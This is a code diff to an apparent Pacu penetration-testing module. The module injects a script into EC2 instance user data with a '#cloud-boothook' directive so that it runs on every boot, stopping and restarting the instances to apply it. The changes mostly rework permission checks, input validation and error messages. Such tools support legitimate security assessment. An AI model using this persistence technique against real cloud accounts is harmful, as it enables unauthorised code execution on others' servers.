@@ -52,31 +52,12 @@ def main(args, pacu_main):
 
     client = pacu_main.get_boto3_client('ec2', random.choice(regions))
 
-    # Check permissions before hammering through each region
-    try:
-        client.stop_instances(
-            DryRun=True,
-            InstanceIds=['i-asdasdas']
-        )
-        client.describe_instance_attribute(  # This isn't necesarilly required, but ideally you don't delete the old user data and you read it then append the script to instead of replace it and mess up something on the instance
-            DryRun=True,
-            InstanceId='i-adsadsada'
-        )
-        client.start_instances(
-            DryRun=True,
-            InstanceIds=['i-asdasdasd']
-        )
-        client.modify_instance_attribute(
-            DryRun=True,
-            InstanceId='i-asdasdas'
-        )
-    except ClientError as error:
-        if not str(error).find('UnauthorizedOperation') == -1:
-            print('Dry run failed, the current AWS account does not have the necessary permissions to run this module.\nExiting...')
-            return
     instances = []
     if args.instance_ids is not None:  # need to update this to include the regions of these IDs
         for instance in args.instance_ids.split(','):
+            if "@" not in instance:
+                print("Usage: <instance-id>@<region>   ex: i-abcdef12345@us-west-2")
+                return({"error": "invalid usage"})
             instances.append({
                 'InstanceId': instance.split('@')[0],
                 'Region': instance.split('@')[1]
@@ -121,10 +102,11 @@ def stop_instance(client, instance_id, print):
         return True
     except ClientError as error:
         code = error.response['Error']['Code']
+        print('FAILURE: ')
         if code == 'UnauthorizedOperation':
-            print('  FAILURE: MISSING REQUIRED AWS PERMISSIONS')
+            print('  Access denied to StopInstances.')
         else:
-            print('  FAILURE: {}'.format(code))
+            print('  ' + code)
     return False
 
 
@@ -135,30 +117,42 @@ def start_instance(client, instance_id, print):
         return True
     except ClientError as error:
         code = error.response['Error']['Code']
+        print('FAILURE: ')
         if code == 'UnauthorizedOperation':
-            print('  FAILURE: MISSING REQUIRED AWS PERMISSIONS')
+            print('  Access denied to StartInstances.')
         else:
-            print('  FAILURE: {}'.format(code))
+            print('  ' + code)
     return False
 
 
-def prepare_user_data(client, instance_id, script):  # Replace this with a fetch_data of download_ec2_userdata
-    response = client.describe_instance_attribute(
-        Attribute='userData',
-        InstanceId=instance_id
-    )
-    user_data = ''
-    if response['UserData']:
-        user_data = base64.b64decode(response['UserData']['Value']).decode("utf-8")
-        # Save the current data in case there is something sensitive
-        # with open('output/scrapedUserData.txt', 'a+') as scraped_user_data_file:
-        #     scraped_user_data_file.write('User data for instance id {}: {}\n'.format(instance_id, user_data))
+def prepare_user_data(client, instance_id, script):
+    # TODO: Replace this with a fetch_data of download_ec2_userdata
+    # This will error if the UserData is gzipped
+    try:
+        response = client.describe_instance_attribute(
+            Attribute='userData',
+            InstanceId=instance_id
+        )
+        user_data = ''
+        if response['UserData']:
+            user_data = base64.b64decode(response['UserData']['Value']).decode("utf-8")
+            # Save the current data in case there is something sensitive
+            # with open('output/scrapedUserData.txt', 'a+') as scraped_user_data_file:
+            #     scraped_user_data_file.write('User data for instance id {}: {}\n'.format(instance_id, user_data))
 
-    with open(script, 'r') as shell_script:
-        # Append our script to their old user data to not screw up the instance
-        user_data = '#cloud-boothook\n{}\n\n{}'.format(shell_script.read(), user_data)  # the #cloud-boothook directive is what runs the code every single time the EC2 starts. Regular old user data only runs on the first instance launch
+        with open(script, 'r') as shell_script:
+            # Append our script to their old user data to not screw up the instance
+            user_data = '#cloud-boothook\n{}\n\n{}'.format(shell_script.read(), user_data)  # the #cloud-boothook directive is what runs the code every single time the EC2 starts. Regular old user data only runs on the first instance launch
 
-    return user_data
+        return user_data
+    except ClientError as error:
+        code = error.response['Error']['Code']
+        print('FAILURE: ')
+        if code == 'UnauthorizedOperation':
+            print('  Access denied to DescribeInstanceAttribute.')
+        else:
+            print('  ' + code)
+        return False
 
 
 def update_userdata(client, instance_id, user_data, print):
@@ -178,8 +172,12 @@ def update_userdata(client, instance_id, user_data, print):
             result = True
         except ClientError as error:
             code = error.response['Error']['Code']
-            if code != 'IncorrectInstanceState':
+            if code == 'UnauthorizedOperation':
+                print('  Access denied to ModifyInstanceAttribute.')
+                return False
+            elif code != 'IncorrectInstanceState':
                 print(error.response['Error']['Message'])
+                return False
             time.sleep(5)
 
     return result
